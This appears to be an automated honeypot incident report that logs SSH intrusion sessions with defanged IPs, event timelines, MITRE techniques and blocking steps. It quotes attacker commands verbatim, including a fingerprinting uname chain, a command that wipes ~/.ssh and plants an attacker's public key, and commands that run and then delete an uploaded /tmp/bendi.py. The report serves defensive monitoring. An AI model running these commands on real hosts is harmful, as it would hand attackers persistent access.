### 🔴 HIGH · IR-20327eb3479b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:06 |
| **Last Seen** | 2026-07-25 10:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:06:30` | `cowrie.session.connect` |
| `2026-07-25 10:06:30` | `cowrie.client.version` |
| `2026-07-25 10:06:30` | `cowrie.client.kex` |
| `2026-07-25 10:06:31` | `cowrie.login.success` |
| `2026-07-25 10:06:33` | `cowrie.session.params` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.success` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.command.input` |
| `2026-07-25 10:06:33` | `cowrie.log.closed` |
| `2026-07-25 10:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87f7a0b7ce7

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-25 10:07 |
| **Last Seen** | 2026-07-25 10:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:07:38` | `cowrie.session.connect` |
| `2026-07-25 10:07:39` | `cowrie.client.version` |
| `2026-07-25 10:07:39` | `cowrie.client.kex` |
| `2026-07-25 10:07:40` | `cowrie.login.success` |
| `2026-07-25 10:07:40` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f47b5c4a2c

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-07-25 10:07 |
| **Last Seen** | 2026-07-25 10:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:07:45` | `cowrie.session.connect` |
| `2026-07-25 10:07:46` | `cowrie.client.version` |
| `2026-07-25 10:07:46` | `cowrie.client.kex` |
| `2026-07-25 10:07:48` | `cowrie.login.success` |
| `2026-07-25 10:07:49` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6489fcdee25d

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:08 |
| **Last Seen** | 2026-07-25 10:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:08:02` | `cowrie.session.connect` |
| `2026-07-25 10:08:02` | `cowrie.client.version` |
| `2026-07-25 10:08:02` | `cowrie.client.kex` |
| `2026-07-25 10:08:03` | `cowrie.login.success` |
| `2026-07-25 10:08:04` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:08:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:08:04` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083c632cc859

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:08 |
| **Last Seen** | 2026-07-25 10:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:08:31` | `cowrie.session.connect` |
| `2026-07-25 10:08:31` | `cowrie.client.version` |
| `2026-07-25 10:08:31` | `cowrie.client.kex` |
| `2026-07-25 10:08:32` | `cowrie.login.success` |
| `2026-07-25 10:08:34` | `cowrie.session.params` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.success` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:34` | `cowrie.command.input` |
| `2026-07-25 10:08:35` | `cowrie.log.closed` |
| `2026-07-25 10:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f033a57b68f

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:09 |
| **Last Seen** | 2026-07-25 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:09:01` | `cowrie.session.connect` |
| `2026-07-25 10:09:02` | `cowrie.client.version` |
| `2026-07-25 10:09:02` | `cowrie.client.kex` |
| `2026-07-25 10:09:04` | `cowrie.login.success` |
| `2026-07-25 10:09:04` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:09:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:09:04` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d7cac550915

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-25 10:10 |
| **Last Seen** | 2026-07-25 10:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:10:17` | `cowrie.session.connect` |
| `2026-07-25 10:10:17` | `cowrie.client.version` |
| `2026-07-25 10:10:17` | `cowrie.client.kex` |
| `2026-07-25 10:10:17` | `cowrie.login.success` |
| `2026-07-25 10:10:17` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:10:17` | `cowrie.direct-tcpip.ja4` |
| `2026-07-25 10:10:17` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67eb9a40ac8c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:10 |
| **Last Seen** | 2026-07-25 10:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:10:23` | `cowrie.session.connect` |
| `2026-07-25 10:10:23` | `cowrie.client.version` |
| `2026-07-25 10:10:23` | `cowrie.client.kex` |
| `2026-07-25 10:10:24` | `cowrie.login.success` |
| `2026-07-25 10:10:25` | `cowrie.session.params` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.success` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.command.input` |
| `2026-07-25 10:10:25` | `cowrie.log.closed` |
| `2026-07-25 10:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5923547c8fc7

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:10 |
| **Last Seen** | 2026-07-25 10:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:10:42` | `cowrie.session.connect` |
| `2026-07-25 10:10:42` | `cowrie.client.version` |
| `2026-07-25 10:10:43` | `cowrie.client.kex` |
| `2026-07-25 10:10:44` | `cowrie.login.success` |
| `2026-07-25 10:10:44` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:10:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:10:44` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b7f4141e82

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-07-25 10:11 |
| **Last Seen** | 2026-07-25 10:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:11:06` | `cowrie.session.connect` |
| `2026-07-25 10:11:08` | `cowrie.client.version` |
| `2026-07-25 10:11:08` | `cowrie.client.kex` |
| `2026-07-25 10:11:17` | `cowrie.login.success` |
| `2026-07-25 10:11:19` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b7ff694c22

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-07-25 10:11 |
| **Last Seen** | 2026-07-25 10:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:11:28` | `cowrie.session.connect` |
| `2026-07-25 10:11:29` | `cowrie.client.version` |
| `2026-07-25 10:11:29` | `cowrie.client.kex` |
| `2026-07-25 10:11:31` | `cowrie.login.success` |
| `2026-07-25 10:11:32` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a1ed205349

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:11` | `cowrie.session.connect` |
| `2026-07-25 10:12:12` | `cowrie.client.version` |
| `2026-07-25 10:12:12` | `cowrie.client.kex` |
| `2026-07-25 10:12:13` | `cowrie.login.success` |
| `2026-07-25 10:12:15` | `cowrie.session.params` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.success` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.command.input` |
| `2026-07-25 10:12:15` | `cowrie.log.closed` |
| `2026-07-25 10:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd759beb1b1

| Field | Detail |
|---|---|
| **Source IP** | `118.193.40[.]61` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:25` | `cowrie.session.connect` |
| `2026-07-25 10:12:25` | `cowrie.client.version` |
| `2026-07-25 10:12:25` | `cowrie.client.kex` |
| `2026-07-25 10:12:26` | `cowrie.login.success` |
| `2026-07-25 10:12:27` | `cowrie.session.params` |
| `2026-07-25 10:12:27` | `cowrie.command.input` |
| `2026-07-25 10:12:27` | `cowrie.command.failed` |
| `2026-07-25 10:12:27` | `cowrie.log.closed` |
| `2026-07-25 10:12:28` | `cowrie.session.params` |
| `2026-07-25 10:12:28` | `cowrie.command.input` |
| `2026-07-25 10:12:28` | `cowrie.session.file_download` |
| `2026-07-25 10:12:28` | `cowrie.log.closed` |
| `2026-07-25 10:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.40[.]61` to AbuseIPDB if not already reported
- [ ] Block `118.193.40[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70564d73ef36

| Field | Detail |
|---|---|
| **Source IP** | `118.193.40[.]61` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:28` | `cowrie.session.connect` |
| `2026-07-25 10:12:28` | `cowrie.client.version` |
| `2026-07-25 10:12:29` | `cowrie.client.kex` |
| `2026-07-25 10:12:30` | `cowrie.login.success` |
| `2026-07-25 10:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.40[.]61` to AbuseIPDB if not already reported
- [ ] Block `118.193.40[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e424ed8060b4

| Field | Detail |
|---|---|
| **Source IP** | `118.193.40[.]61` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:30` | `cowrie.session.connect` |
| `2026-07-25 10:12:30` | `cowrie.client.version` |
| `2026-07-25 10:12:30` | `cowrie.client.kex` |
| `2026-07-25 10:12:31` | `cowrie.login.success` |
| `2026-07-25 10:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.40[.]61` to AbuseIPDB if not already reported
- [ ] Block `118.193.40[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d52d1cb3fc

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:57` | `cowrie.session.connect` |
| `2026-07-25 10:12:57` | `cowrie.client.version` |
| `2026-07-25 10:12:57` | `cowrie.client.kex` |
| `2026-07-25 10:12:58` | `cowrie.login.success` |
| `2026-07-25 10:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6b5ffb7bcc

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-25 10:12 |
| **Last Seen** | 2026-07-25 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:12:58` | `cowrie.session.connect` |
| `2026-07-25 10:12:58` | `cowrie.client.version` |
| `2026-07-25 10:12:58` | `cowrie.client.kex` |
| `2026-07-25 10:12:59` | `cowrie.login.success` |
| `2026-07-25 10:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e291f5f444

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-25 10:13 |
| **Last Seen** | 2026-07-25 10:15 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:13:05` | `cowrie.session.connect` |
| `2026-07-25 10:13:05` | `cowrie.client.version` |
| `2026-07-25 10:13:05` | `cowrie.client.kex` |
| `2026-07-25 10:13:06` | `cowrie.login.success` |
| `2026-07-25 10:13:07` | `cowrie.session.file_upload` |
| `2026-07-25 10:13:08` | `cowrie.session.params` |
| `2026-07-25 10:13:08` | `cowrie.command.input` |
| `2026-07-25 10:13:08` | `cowrie.command.input` |
| `2026-07-25 10:13:08` | `cowrie.command.input` |
| `2026-07-25 10:13:08` | `cowrie.command.failed` |
| `2026-07-25 10:13:09` | `cowrie.log.closed` |
| `2026-07-25 10:13:10` | `cowrie.session.params` |
| `2026-07-25 10:13:10` | `cowrie.command.input` |
| `2026-07-25 10:13:10` | `cowrie.log.closed` |
| `2026-07-25 10:13:11` | `cowrie.session.params` |
| `2026-07-25 10:13:11` | `cowrie.command.input` |
| `2026-07-25 10:13:11` | `cowrie.log.closed` |
| `2026-07-25 10:13:12` | `cowrie.session.params` |
| `2026-07-25 10:13:12` | `cowrie.command.input` |
| `2026-07-25 10:13:12` | `cowrie.command.failed` |
| `2026-07-25 10:13:12` | `cowrie.command.failed` |
| `2026-07-25 10:14:13` | `cowrie.session.params` |
| `2026-07-25 10:14:13` | `cowrie.command.input` |
| `2026-07-25 10:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a4f45d824d

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 10:13 |
| **Last Seen** | 2026-07-25 10:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:13:10` | `cowrie.session.connect` |
| `2026-07-25 10:13:10` | `cowrie.client.version` |
| `2026-07-25 10:13:10` | `cowrie.client.kex` |
| `2026-07-25 10:13:12` | `cowrie.login.success` |
| `2026-07-25 10:13:12` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:13:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:13:15` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e51cb2e16a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:14 |
| **Last Seen** | 2026-07-25 10:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
